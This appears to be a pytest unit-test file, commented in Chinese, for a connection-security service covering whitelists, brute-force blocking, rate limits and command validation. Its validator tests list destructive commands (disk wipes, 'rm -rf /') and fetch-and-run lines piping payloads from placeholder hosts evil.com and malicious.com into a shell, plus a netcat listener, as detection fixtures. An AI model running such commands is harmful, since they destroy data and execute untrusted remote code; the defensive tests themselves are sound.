"""
安全服務單元測試

測試連接白名單檢查、異常連接檢測和安全日誌記錄功能
"""

import pytest
from unittest.mock import Mock, patch
from datetime import datetime, timedelta

from services.security_service import (
    SecurityService, SecurityLevel, SecurityEventType,
    SecurityEvent, RateLimitConfig, ConnectionAttempt
)


class TestSecurityService:
    """測試安全服務"""
    
    def setup_method(self):
        """測試前設置"""
        self.security_service = SecurityService()
    
    def test_service_initialization(self):
        """測試服務初始化"""
        assert len(self.security_service.ip_whitelist) >= 3  # 預設白名單
        assert len(self.security_service.rate_limits) >= 2
        assert len(self.security_service.dangerous_commands) > 0
        assert len(self.security_service.suspicious_patterns) > 0
    
    def test_add_to_ip_whitelist_success(self):
        """測試添加 IP 到白名單成功"""
        test_ip = "192.168.1.100"
        result = self.security_service.add_to_whitelist("ip", test_ip)
        
        assert result is True
        assert test_ip in self.security_service.ip_whitelist
    
    def test_add_to_ip_whitelist_invalid_ip(self):
        """測試添加無效 IP 到白名單失敗"""
        invalid_ip = "invalid-ip-address"
        result = self.security_service.add_to_whitelist("ip", invalid_ip)
        
        assert result is False
        assert invalid_ip not in self.security_service.ip_whitelist
    
    def test_add_to_host_whitelist(self):
        """測試添加主機到白名單"""
        test_host = "example.com"
        result = self.security_service.add_to_whitelist("host", test_host)
        
        assert result is True
        assert test_host in self.security_service.host_whitelist
    
    def test_add_to_user_whitelist(self):
        """測試添加使用者到白名單"""
        test_user = "admin"
        result = self.security_service.add_to_whitelist("user", test_user)
        
        assert result is True
        assert test_user in self.security_service.user_whitelist
    
    def test_add_to_whitelist_invalid_type(self):
        """測試添加無效類型到白名單失敗"""
        result = self.security_service.add_to_whitelist("invalid", "test")
        
        assert result is False
    
    def test_remove_from_whitelist_success(self):
        """測試從白名單移除項目成功"""
        test_ip = "192.168.1.200"
        self.security_service.add_to_whitelist("ip", test_ip)
        
        result = self.security_service.remove_from_whitelist("ip", test_ip)
        
        assert result is True
        assert test_ip not in self.security_service.ip_whitelist
    
    def test_remove_from_whitelist_not_exist(self):
        """測試從白名單移除不存在項目失敗"""
        result = self.security_service.remove_from_whitelist("ip", "192.168.1.999")
        
        assert result is False
    
    def test_check_ip_whitelist_exact_match(self):
        """測試 IP 白名單精確匹配"""
        test_ip = "10.0.0.100"
        self.security_service.add_to_whitelist("ip", test_ip)
        
        result = self.security_service.check_ip_whitelist(test_ip)
        assert result is True
    
    def test_check_ip_whitelist_cidr_match(self):
        """測試 IP 白名單 CIDR 網段匹配"""
        # 添加網段到白名單
        self.security_service.add_to_whitelist("ip", "192.168.1.0/24")
        
        # 測試網段內的 IP
        result = self.security_service.check_ip_whitelist("192.168.1.50")
        assert result is True
        
        # 測試網段外的 IP
        result = self.security_service.check_ip_whitelist("192.168.2.50")
        assert result is False
    
    def test_check_ip_whitelist_empty_list(self):
        """測試空白名單允許所有 IP"""
        # 清空白名單
        self.security_service.ip_whitelist.clear()
        
        result = self.security_service.check_ip_whitelist("any.ip.address")
        assert result is True
    
    def test_check_connection_allowed_success(self):
        """測試連接檢查通過"""
        source_ip = "127.0.0.1"  # 預設在白名單
        target_host = "test-server"
        username = "admin"
        
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, target_host, username
        )
        
        assert allowed is True
        assert reason == ""
    
    def test_check_connection_allowed_ip_blacklisted(self):
        """測試黑名單 IP 連接被拒絕"""
        source_ip = "192.168.1.100"
        self.security_service.ip_blacklist.add(source_ip)
        
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, "test-server", "admin"
        )
        
        assert allowed is False
        assert "黑名單" in reason
    
    def test_check_connection_allowed_ip_blocked(self):
        """測試被暫時封鎖的 IP 連接被拒絕"""
        source_ip = "192.168.1.101"
        block_until = datetime.now() + timedelta(minutes=5)
        self.security_service.blocked_ips[source_ip] = block_until
        
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, "test-server", "admin"
        )
        
        assert allowed is False
        assert "暫時封鎖" in reason
    
    def test_check_connection_allowed_ip_block_expired(self):
        """測試已過期封鎖的 IP 連接被允許"""
        source_ip = "192.168.1.102"
        block_until = datetime.now() - timedelta(minutes=5)  # 已過期
        self.security_service.blocked_ips[source_ip] = block_until
        
        # 將 IP 添加到白名單以通過白名單檢查
        self.security_service.add_to_whitelist("ip", source_ip)
        
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, "test-server", "admin"
        )
        
        assert allowed is True
        assert source_ip not in self.security_service.blocked_ips  # 應該被清除
    
    def test_check_connection_allowed_ip_not_in_whitelist(self):
        """測試不在白名單的 IP 連接被拒絕"""
        # 確保白名單不為空
        self.security_service.add_to_whitelist("ip", "192.168.1.50")
        
        source_ip = "10.0.0.100"  # 不在白名單
        
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, "test-server", "admin"
        )
        
        assert allowed is False
        assert "不在白名單" in reason
    
    def test_check_connection_allowed_host_whitelist(self):
        """測試主機白名單檢查"""
        source_ip = "127.0.0.1"
        target_host = "allowed-server"
        
        # 設定主機白名單
        self.security_service.add_to_whitelist("host", "allowed-server")
        
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, target_host, "admin"
        )
        assert allowed is True
        
        # 測試不在白名單的主機
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, "blocked-server", "admin"
        )
        assert allowed is False
        assert "主機不在白名單" in reason
    
    def test_check_connection_allowed_user_whitelist(self):
        """測試使用者白名單檢查"""
        source_ip = "127.0.0.1"
        username = "allowed-user"
        
        # 設定使用者白名單
        self.security_service.add_to_whitelist("user", "allowed-user")
        
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, "test-server", username
        )
        assert allowed is True
        
        # 測試不在白名單的使用者
        allowed, reason = self.security_service.check_connection_allowed(
            source_ip, "test-server", "blocked-user"
        )
        assert allowed is False
        assert "使用者不在白名單" in reason
    
    def test_record_connection_attempt_success(self):
        """測試記錄成功連接嘗試"""
        source_ip = "192.168.1.100"
        target_host = "test-server"
        username = "admin"
        
        initial_count = len(self.security_service.connection_history)
        
        self.security_service.record_connection_attempt(
            source_ip, target_host, username, success=True
        )
        
        assert len(self.security_service.connection_history) == initial_count + 1
        
        latest_attempt = self.security_service.connection_history[-1]
        assert latest_attempt.source_ip == source_ip
        assert latest_attempt.target_host == target_host
        assert latest_attempt.username == username
        assert latest_attempt.success is True
        
        # 成功連接應該清空失敗記錄
        assert len(self.security_service.failed_attempts[source_ip]) == 0
    
    def test_record_connection_attempt_failure(self):
        """測試記錄失敗連接嘗試"""
        source_ip = "192.168.1.101"
        target_host = "test-server"
        username = "admin"
        error_message = "Authentication failed"
        
        self.security_service.record_connection_attempt(
            source_ip, target_host, username, success=False, error_message=error_message
        )
        
        # 檢查失敗記錄
        assert len(self.security_service.failed_attempts[source_ip]) == 1
        
        # 檢查連接歷史
        latest_attempt = self.security_service.connection_history[-1]
        assert latest_attempt.success is False
        assert latest_attempt.error_message == error_message
    
    def test_brute_force_detection(self):
        """測試暴力破解檢測"""
        source_ip = "192.168.1.102"
        target_host = "test-server"
        username = "admin"
        
        # 模擬連續失敗嘗試
        for i in range(5):
            self.security_service.record_connection_attempt(
                source_ip, target_host, username, success=False, error_message="Auth failed"
            )
        
        # IP 應該被封鎖
        assert source_ip in self.security_service.blocked_ips
        
        # 檢查安全事件
        brute_force_events = [
            e for e in self.security_service.security_events
            if e.event_type == SecurityEventType.BRUTE_FORCE_DETECTED
        ]
        assert len(brute_force_events) >= 1
    
    def test_validate_command_safe(self):
        """測試安全指令驗證"""
        safe_commands = [
            "ls -la",
            "ps aux",
            "df -h",
            "free -m",
            "uptime",
            "who"
        ]
        
        for command in safe_commands:
            safe, reason = self.security_service.validate_command(
                command, "admin", "test-server"
            )
            assert safe is True
            assert reason == ""
    
    def test_validate_command_dangerous(self):
        """測試危險指令驗證"""
        dangerous_commands = [
            "rm -rf /",
            "mkfs /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "chmod -R 777 /",
            "rm -rf /usr"
        ]
        
        for command in dangerous_commands:
            safe, reason = self.security_service.validate_command(
                command, "admin", "test-server"
            )
            assert safe is False
            assert "危險模式" in reason
    
    def test_validate_command_suspicious(self):
        """測試可疑指令檢測"""
        suspicious_commands = [
            "wget http://malicious.com/script.sh | sh",
            "curl -s http://evil.com/payload | bash",
            "nc -l -p 1234",
            "python -c 'exec(open(\"backdoor.py\").read())'"
        ]
        
        for command in suspicious_commands:
            # 可疑指令應該通過但被記錄
            safe, reason = self.security_service.validate_command(
                command, "admin", "test-server"
            )
            
            # 檢查是否記錄了可疑活動事件
            suspicious_events = [
                e for e in self.security_service.security_events
                if e.event_type == SecurityEventType.SUSPICIOUS_ACTIVITY
            ]
            assert len(suspicious_events) > 0
    
    def test_get_security_summary(self):
        """測試獲取安全摘要"""
        # 添加一些測試數據
        self.security_service.record_connection_attempt(
            "192.168.1.100", "test-server", "admin", success=True
        )
        self.security_service.record_connection_attempt(
            "192.168.1.101", "test-server", "admin", success=False, error_message="Auth failed"
        )
        
        summary = self.security_service.get_security_summary()
        
        assert "total_events_24h" in summary
        assert "event_types" in summary
        assert "severity_distribution" in summary
        assert "blocked_ips" in summary
        assert "whitelist_size" in summary
        assert "connection_attempts_24h" in summary
        
        assert summary["connection_attempts_24h"] >= 2
    
    def test_get_recent_events(self):
        """測試獲取最近事件"""
        # 添加測試事件
        self.security_service._log_security_event(
            SecurityEventType.CONNECTION_SUCCESS,
            "192.168.1.100",
            "test-server",
            "admin",
            {},
            SecurityLevel.LOW
        )
        
        events = self.security_service.get_recent_events(limit=10)
        
        assert len(events) >= 1
        assert all(isinstance(event, dict) for event in events)
        assert all("event_type" in event for event in events)
        assert all("timestamp" in event for event in events)
    
    def test_get_recent_events_with_severity_filter(self):
        """測試按嚴重程度過濾事件"""
        # 添加不同嚴重程度的事件
        self.security_service._log_security_event(
            SecurityEventType.CONNECTION_SUCCESS,
            "192.168.1.100", "test-server", "admin", {}, SecurityLevel.LOW
        )
        self.security_service._log_security_event(
            SecurityEventType.CONNECTION_FAILURE,
            "192.168.1.101", "test-server", "admin", {}, SecurityLevel.MEDIUM
        )
        self.security_service._log_security_event(
            SecurityEventType.BRUTE_FORCE_DETECTED,
            "192.168.1.102", "test-server", "admin", {}, SecurityLevel.CRITICAL
        )
        
        # 只獲取嚴重事件
        critical_events = self.security_service.get_recent_events(
            limit=10,
            severity_filter=SecurityLevel.CRITICAL
        )
        
        assert len(critical_events) >= 1
        assert all(event["severity"] == "critical" for event in critical_events)
    
    def test_cleanup_old_data(self):
        """測試清理舊數據"""
        source_ip = "192.168.1.100"
        
        # 添加一些舊數據
        old_time = datetime.now() - timedelta(days=10)
        
        # 添加舊的失敗嘗試記錄
        self.security_service.failed_attempts[source_ip].append(old_time)
        self.security_service.failed_attempts[source_ip].append(datetime.now())
        
        # 添加過期的封鎖
        expired_ip = "192.168.1.200"
        self.security_service.blocked_ips[expired_ip] = datetime.now() - timedelta(hours=2)
        
        self.security_service.cleanup_old_data(days=7)
        
        # 舊記錄應該被清理
        assert len(self.security_service.failed_attempts[source_ip]) == 1
        
        # 過期封鎖應該被清除
        assert expired_ip not in self.security_service.blocked_ips
    
    def test_rate_limit_check(self):
        """測試速率限制檢查"""
        identifier = "192.168.1.100"
        
        # 初始應該通過
        result = self.security_service._check_rate_limits(identifier, "connection")
        assert result is True
        
        # 添加多次失敗嘗試
        config = self.security_service.rate_limits["connection"]
        for _ in range(config.max_requests):
            self.security_service.failed_attempts[identifier].append(datetime.now())
        
        # 應該被限制
        result = self.security_service._check_rate_limits(identifier, "connection")
        assert result is False
        
        # IP 應該被封鎖
        assert identifier in self.security_service.blocked_ips


class TestSecurityServiceHelpers:
    """測試安全服務便利函數"""
    
    def test_check_connection_security(self):
        """測試連接安全檢查便利函數"""
        from services.security_service import check_connection_security
        
        allowed, reason = check_connection_security(
            "127.0.0.1", "test-server", "admin"
        )
        
        assert allowed is True
        assert reason == ""
    
    def test_validate_command_security(self):
        """測試指令安全驗證便利函數"""
        from services.security_service import validate_command_security
        
        safe, reason = validate_command_security(
            "ls -la", "admin", "test-server"
        )
        
        assert safe is True
        assert reason == ""
        
        # 測試危險指令
        safe, reason = validate_command_security(
            "rm -rf /", "admin", "test-server"
        )
        
        assert safe is False
        assert "危險模式" in reason
    
    def test_record_security_event(self):
        """測試記錄安全事件便利函數"""
        from services.security_service import record_security_event
        
        initial_count = len(
            [e for e in security_service.security_events if e.event_type == SecurityEventType.CONNECTION_SUCCESS]
        )
        
        record_security_event(
            "192.168.1.100", "test-server", "admin", success=True
        )
        
        # 檢查是否記錄了事件
        success_events = [
            e for e in security_service.security_events 
            if e.event_type == SecurityEventType.CONNECTION_SUCCESS
        ]
        assert len(success_events) > initial_count


# 全域服務實例測試
def test_global_security_service():
    """測試全域安全服務實例"""
    from services.security_service import security_service
    
    assert security_service is not None
    assert hasattr(security_service, 'check_connection_allowed')
    assert hasattr(security_service, 'validate_command')


if __name__ == "__main__":
    pytest.main([__file__, "-v"])